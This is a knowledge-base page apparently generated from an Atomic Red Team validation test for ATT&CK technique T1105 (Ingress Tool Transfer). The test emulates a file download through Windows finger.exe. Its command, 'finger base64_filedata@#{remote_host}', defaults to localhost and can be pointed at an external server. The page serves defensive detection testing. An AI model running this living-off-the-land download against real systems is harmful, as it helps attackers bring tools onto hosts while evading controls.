---
atomic_guid: "5f507e45-8411-4f99-84e7-e38530c45d01"
title: "File download with finger.exe on Windows"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "5f507e45-8411-4f99-84e7-e38530c45d01"
  - "File download with finger.exe on Windows"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# File download with finger.exe on Windows

Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.
Because this is being tested on the localhost, you should not be expecting a successful connection
https://www.exploit-db.com/exploits/48815
https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/

## Metadata

- Atomic GUID: 5f507e45-8411-4f99-84e7-e38530c45d01
- Technique: T1105: Ingress Tool Transfer
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1105/T1105.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Input Arguments

### remote_host

- description: Remote hostname or IP address
- type: string
- default: localhost

## Executor

- name: command_prompt

### Command

```cmd
finger base64_filedata@#{remote_host}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
